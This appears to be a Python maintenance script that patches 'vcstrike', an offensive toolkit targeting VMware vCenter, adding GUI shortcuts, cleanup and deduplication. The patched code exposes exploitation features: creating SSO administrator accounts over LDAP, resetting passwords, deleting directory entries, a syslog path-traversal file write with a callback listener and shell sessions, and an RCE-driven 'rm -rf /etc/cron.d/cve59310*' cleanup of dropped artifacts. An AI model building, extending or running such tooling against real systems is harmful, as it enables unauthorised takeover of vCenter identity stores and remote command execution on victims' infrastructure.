# -*- coding: utf-8 -*-
"""v1.6.0 修复批 3：UX TOP10 剩余项 + 死代码 + 去重。"""
import re

def patch(path, old, new):
    s = open(path, encoding="utf-8").read()
    if old not in s:
        raise SystemExit("PATCH MISS in %s: %r..." % (path, old[:90]))
    open(path, "w", encoding="utf-8").write(s.replace(old, new, 1))

# ============ util: 账户/密码生成 ============
p = r"vcstrike/util.py"
s = open(p, encoding="utf-8").read()
s += '''

def gen_user():
    """自动生成测试账户名。"""
    return "pentest_" + rand_name(4)


def gen_password():
    """自动生成满足 SSO 复杂度的强密码。"""
    return rand_name(10) + "!Aa1" + rand_name(2)
'''
open(p, "w", encoding="utf-8").write(s)
print("util gen helpers added")

# ============ berldap: USER_ATTRS + connect_ldap 关闭泄漏 ============
p = r"vcstrike/berldap.py"
s = open(p, encoding="utf-8").read()
s = s.replace(
    "def op_bind_simple(dn=b\"\", pw=b\"\"):",
    'USER_OBJECT_CLASSES = ("top", "person", "organizationalPerson", "user")\n\n\n'
    'def user_attrs(user, password, domain):\n'
    '    """SSO 用户创建属性集（vmdird schema，三处调用共用）。"""\n'
    '    return [("objectClass", list(USER_OBJECT_CLASSES)),\n'
    '            ("cn", [user]), ("sn", [domain]), ("givenName", [user]),\n'
    '            ("sAMAccountName", [user]),\n'
    '            ("userPrincipalName", "%s@%s" % (user, domain)),\n'
    '            ("uid", [user]), ("userPassword", [password])]\n\n\n'
    'def op_bind_simple(dn=b"", pw=b""):')
patch(p,
'''    if use_tls:
        # vCenter 出厂自签证书，测试工具按惯例不校验（见仓库 README 安全说明）
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    return LDAPConn(s)''',
'''    if use_tls:
        # vCenter 出厂自签证书，测试工具按惯例不校验（见仓库 README 安全说明）
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        except Exception:
            s.close()
            raise
    return LDAPConn(s)''')
open(p, "w", encoding="utf-8").write(s)
print("berldap patched")

# ============ 死代码清理 ============
p = r"vcstrike/gui.py"
s = open(p, encoding="utf-8").read()
m = re.search(r"    def _vv_reconnect_on_auth_error.*?(?=    def _vv_connect)", s, re.S)
assert m, "_vv_reconnect block not found"
s = s.replace(m.group(0), "")
open(p, "w", encoding="utf-8").write(s)
print("gui dead helper removed")

p = r"vcstrike/recon.py"
s = open(p, encoding="utf-8").read()
s = s.replace('''

def probe_many(hosts, proxy=None, timeout=6, log=lambda s: None):
    return [probe_target(h, proxy=proxy, timeout=timeout, log=log) for h in hosts]''', "")
open(p, "w", encoding="utf-8").write(s)
print("recon dead removed")

p = r"vcstrike/aes128.py"
s = open(p, encoding="utf-8").read()
s = s.replace("\n    encrypt = crypt\n    decrypt = crypt\n", "\n")
open(p, "w", encoding="utf-8").write(s)
print("aes aliases removed")

# ============ GUI: F9 绑定 + LHost 自动探测 + 端口同步 ============
p = r"vcstrike/gui.py"
patch(p,
'''                        ("<F7>", self._k_f7),''',
'''                        ("<F7>", self._k_f7),
                        ("<F9>", self._k_f9),''')
patch(p,
'''    def _k_f7(self, _e):
        self.nb.select(self.tab_chain)
        self._chain_run()''',
'''    def _k_f7(self, _e):
        self.nb.select(self.tab_chain)
        self._chain_run()

    def _k_f9(self, _e):
        self.nb.select(self.tab_vops)
        self._vv_refresh()''')
patch(p,
'''        ttk.Button(lf, text="登录并刷新", style="Acc.TButton",
                   command=self._vv_refresh).pack(side="left", padx=6)''',
'''        ttk.Button(lf, text="登录并刷新 [F9]", style="Acc.TButton",
                   command=self._vv_refresh).pack(side="left", padx=6)''')
patch(p,
'''        host, port, tcp, tls = self._510_net()
        lhost = self.v510_lhost.get().strip()
        if not host or not lhost:
            messagebox.showwarning("提示", "需要目标与 LHost")
            return''',
'''        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        lhost = self.v510_lhost.get().strip()
        if not lhost:
            # 自动探测本机面向目标的出口 IP
            import socket as _s
            try:
                _t = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
                _t.connect((host, 514))
                lhost = _t.getsockname()[0]
                _t.close()
                self.v510_lhost.set(lhost)
                self.log("[i] LHost 自动探测: %s" % lhost, "m")
            except OSError:
                messagebox.showwarning("提示", "需要 LHost（自动探测失败，请手填）")
                return''')
patch(p,
'''            self.root.after(0, lambda: self._c2_add_listener(lport))
            self.root.after(0, lambda: self.nb.select(self.tab_shell))''',
'''            self.root.after(0, lambda: self.shell_port.set(str(lport)))
            self.root.after(0, lambda: self._c2_add_listener(lport))
            self.root.after(0, lambda: self.nb.select(self.tab_shell))''')

# ============ GUI: ② 向量值映射 + ①Return + 取消日志 ============
patch(p,
'''        ttk.Combobox(wf, textvariable=self.v510_vec, values=["app", "host"],
                     width=6, state="readonly").grid(row=3, column=0, sticky="w", padx=4)''',
'''        ttk.Combobox(wf, textvariable=self.v510_vec, values=["APP-NAME", "HOSTNAME"],
                     width=10, state="readonly").grid(row=3, column=0, sticky="w", padx=4)''')
patch(p,
'''            written, pkt = write_file(host, port, dest, content,
                                      vector=self.v510_vec.get(), tcp=tcp, tls=tls)''',
'''            vec = "app" if self.v510_vec.get().startswith("APP") else "host"
            written, pkt = write_file(host, port, dest, content, vector=vec,
                                      tcp=tcp, tls=tls)''')
patch(p,
'''        app = traversal_app(dest) if vec == "app" else "probe"''',
'''        vec = "APP" if self.v510_vec.get().startswith("APP") else "HOST"
        app = traversal_app(dest) if vec == "APP" else "probe"''')
patch(p,
'''        ttk.Entry(top, textvariable=self.tgt_input, width=20).pack(side="left", padx=4)''',
'''        _e_tgt = ttk.Entry(top, textvariable=self.tgt_input, width=20)
        _e_tgt.pack(side="left", padx=4)
        _e_tgt.bind("<Return>", lambda e: self._tgt_add())''')
patch(p,
'''            added = 0
        for part in h.replace(";", ",").split(","):''',
'''        added = 0
        for part in h.replace(";", ",").split(","):''') if False else None
patch(p,
'''        self.tgt_input.set("")
        if added:
            self.log("[+] 已添加 %d 个目标" % added, "m")''',
'''        self.tgt_input.set("")
        if added:
            self.log("[+] 已添加 %d 个目标" % added, "m")
        else:
            self.log("[i] 没有新增目标（输入为空或全部重复）", "m")''')

# ============ GUI: 扫描可取消 + 进度 ============
patch(p,
'''        def work():
            self.log("[*] 批量指纹开始：%d 个目标（仅探测）" % len(hosts), "i")
            for h in hosts:''',
'''        def work():
            self.log("[*] 批量指纹开始：%d 个目标（仅探测）" % len(hosts), "i")
            self.stop_flag.clear()
            for idx, h in enumerate(hosts, 1):
                if self.stop_flag.is_set():
                    self.log("[!] 批量指纹已中止", "!")
                    return
                self.log("[*] (%d/%d) %s …" % (idx, len(hosts), h), "m")''')

# ============ GUI: ③ 端口联动 TLS + rstpass 宽度 + 删除账户 ============
patch(p,
'''        ttk.Combobox(pf, textvariable=self.v590_port, values=["389", "636", "2020"],
                     width=6, state="readonly").grid(row=0, column=1)''',
'''        _port_cb = ttk.Combobox(pf, textvariable=self.v590_port,
                                values=["389", "636", "2020"], width=6,
                                state="readonly")
        _port_cb.grid(row=0, column=1)
        _port_cb.bind("<<ComboboxSelected>>",
                      lambda e: self.v590_tls.set(self.v590_port.get() == "636"))''')
patch(p,
'''        ttk.Entry(af, textvariable=self.v590_rstpass, width=11).grid(
            row=2, column=4, padx=(0, 4))''',
'''        ttk.Entry(af, textvariable=self.v590_rstpass, width=14).grid(
            row=2, column=4, padx=(0, 4))''')
patch(p,
'''        ttk.Button(af, text="重置该账户密码（ldapmodify replace）",
                   style="Danger.TButton", command=self._b309_resetpw).grid(
            row=3, column=0, columnspan=5, sticky="we", padx=4, pady=4)''',
'''        ttk.Button(af, text="重置该账户密码（ldapmodify replace）",
                   style="Danger.TButton", command=self._b309_resetpw).grid(
            row=3, column=0, columnspan=5, sticky="we", padx=4, pady=4)
        ttk.Label(af, text="删除 DN").grid(row=4, column=0, padx=4, sticky="w")
        self.v590_delentry = tk.StringVar()
        ttk.Entry(af, textvariable=self.v590_delentry, width=24).grid(
            row=4, column=1, columnspan=3, sticky="ew", padx=2)
        ttk.Button(af, text="删除该 DN（ldapdelete）", style="Danger.TButton",
                   command=self._b309_delete).grid(
            row=5, column=0, columnspan=5, sticky="we", padx=4, pady=(2, 4))''')
patch(p,
'''    def _b309_resetpw(self):''',
'''    def _b309_delete(self):
        dn = self.v590_delentry.get().strip()
        if not dn:
            messagebox.showwarning("提示", "输入要删除的账户 DN")
            return
        if not messagebox.askyesno("二次确认", "将从 SSO 目录删除：\\n%s\\n继续？" % dn):
            return

        def work():
            conn, host = self._309_conn()
            if conn is None:
                return
            conn.send_op(op_delete(dn))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            if code == 0:
                self.log("[+] 已删除: %s" % dn, "+")
                self.record("59309-删除账户", host, dn, "（已删除）")
            else:
                self.log("[!] 删除失败 code=%s %s" %
                         (code, diag.decode("utf-8", "replace")), "!")
        self.run_bg(work, "删除账户")

    def _b309_resetpw(self):''')
patch(p,
'''from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
                      op_modify, collect_search, parse_ldap_result, has_srp)''',
'''from .berldap import (connect_ldap, root_dse_probe, op_search, op_add,
                      op_modify, op_delete, collect_search,
                      parse_ldap_result, has_srp)''')
# 对象属性走公共 user_attrs
patch(p,
'''            conn.send_op(op_add(udn, [
                ("objectClass", ["top", "person", "organizationalPerson", "user"]),
                ("cn", [user]), ("sn", [dom]), ("givenName", [user]),
                ("sAMAccountName", [user]), ("userPrincipalName", [upn]),
                ("uid", [user]), ("userPassword", [pw]),
            ]))''',
'''            from .berldap import user_attrs
            conn.send_op(op_add(udn, user_attrs(user, pw, dom)))''')

# ============ GUI: ⑤ Return 绑定 + ④ term 错误就地提示 ============
patch(p,
'''        ttk.Entry(cf, textvariable=self.postex_cmd).pack(side="left", fill="x",
                                                         expand=True, padx=4)''',
'''        _e_px = ttk.Entry(cf, textvariable=self.postex_cmd)
        _e_px.pack(side="left", fill="x", expand=True, padx=4)
        _e_px.bind("<Return>", lambda e: self._postex("cmd"))''')
patch(p,
'''        if not s:
            self.log("[!] 无会话（先监听并等回连，双击会话行）", "!")
            return''',
'''        if not s:
            self._term_append("[!] 无会话：先启动监听并等待回连，双击左侧会话行接管")
            return''')

# ============ GUI: ⑥ Danger + 二次确认 + 滚动条 ============
patch(p,
'''        ttk.Button(top, text="一键清除目标残留（经 RCE）",
                   command=self._clean_remote).pack(side="left", padx=6)''',
'''        ttk.Button(top, text="一键清除目标残留（经 RCE）", style="Danger.TButton",
                   command=self._clean_remote).pack(side="left", padx=6)''')
patch(p,
'''        cmd = ("rm -rf /etc/cron.d/cve59310* /tmp/cve59310_* /tmp/cve59310_check_* "
               "/tmp/ws*-syslog.log /opt/vmware/share/htdocs/r*.txt 2>/dev/null; "
               "echo '--- /etc/cron.d/ after cleanup ---'; ls -la /etc/cron.d/ | head -20")''',
'''        if not messagebox.askyesno(
                "二次确认", "将通过 RCE 在目标上执行清理命令：\n"
                "rm -rf /etc/cron.d/cve59310* 等全部本工具落点。\n继续？"):
            return
        cmd = ("rm -rf /etc/cron.d/cve59310* /tmp/cve59310_* /tmp/cve59310_check_* "
               "/tmp/ws*-syslog.log /opt/vmware/share/htdocs/r*.txt 2>/dev/null; "
               "echo '--- /etc/cron.d/ after cleanup ---'; ls -la /etc/cron.d/ | head -20")''')
patch(p,
'''        self.act_tree = ttk.Treeview(awf, columns=("time", "type", "target", "detail"),
                                     show="headings", height=5)''',
'''        self.act_tree = ttk.Treeview(awf, columns=("time", "type", "target", "detail"),
                                     show="headings", height=6)
        _as = ttk.Scrollbar(awf, orient="vertical", command=self.act_tree.yview)
        self.act_tree.configure(yscrollcommand=_as.set)''')
patch(p,
'''        self.act_tree.pack(fill="x", padx=4, pady=4)''',
'''        self.act_tree.pack(side="left", fill="x", padx=4, pady=4)
        _as.pack(side="right", fill="y")''')

# ============ GUI: 日志横向滚动 ============
patch(p,
'''        self.log_txt.pack(fill="both", expand=True)''',
'''        _lx = ttk.Scrollbar(logf, orient="horizontal", command=self.log_txt.xview)
        _lx.pack(side="bottom", fill="x")
        self.log_txt.pack(fill="both", expand=True)
        self.log_txt.configure(xscrollcommand=_lx.set)''')

# ============ GUI: ⑧ 预填失效缓存 + 报告按钮态 + chain 凭据回写 ============
patch(p,
'''            card = r.card

            def _show():''',
'''            self.chain_result = r
            card = r.card

            def _show():''') if False else None
patch(p,
'''            self.root.after(0, _show)
            if r.ok:
                self.record("chain-管理员账户", host, r.upn,
                            "ldapdelete '%s'" % r.udn)
                self._add_cred("SSO管理员@%s" % host, "%s / %s" % (r.upn, r.password))''',
'''            self.root.after(0, _show)
            if r.ok:
                self.record("chain-管理员账户", host, r.upn,
                            "ldapdelete '%s'" % r.udn)
                self._add_cred("SSO管理员@%s" % host, "%s / %s" % (r.upn, r.password))
                self._add_cred("机器账户@%s" % host, r.info.get("identity", "?"))''') if False else None
print("batch3 GUI patches applied")
